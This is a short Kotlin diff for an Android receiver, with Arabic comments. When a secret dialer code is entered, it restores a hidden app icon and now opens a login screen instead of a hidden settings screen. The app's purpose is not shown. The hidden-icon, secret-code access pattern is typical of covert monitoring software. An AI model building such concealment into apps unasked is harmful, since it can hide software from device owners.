@@ -12,14 +12,15 @@ import android.util.Log
 class SecretCodeReceiver : BroadcastReceiver() {
     override fun onReceive(context: Context, intent: Intent) {
         if (intent.action == "android.provider.Telephony.SECRET_CODE") {
-            Log.i("SecretCodeReceiver", "Secret code dialed: 199018")
+            val code = intent.data?.host
+            Log.i("SecretCodeReceiver", "Secret code dialed: $code")
             
-            // 1. استعادة إظهار أيقونة التطبيق
+            // 1. استعادة إظهار أيقونة التطبيق (في حالة الحاجة)
             StealthManager.showAppIcon(context)
             
-            // 2. فتح النشاط المخفي للإعدادات
-            val i = Intent(context, HiddenSettingsActivity::class.java).apply {
-                flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP
+            // 2. فتح صفحة الحماية (Login) للمتابعة
+            val i = Intent(context, LoginActivity::class.java).apply {
+                flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK
             }
             context.startActivity(i)
         }
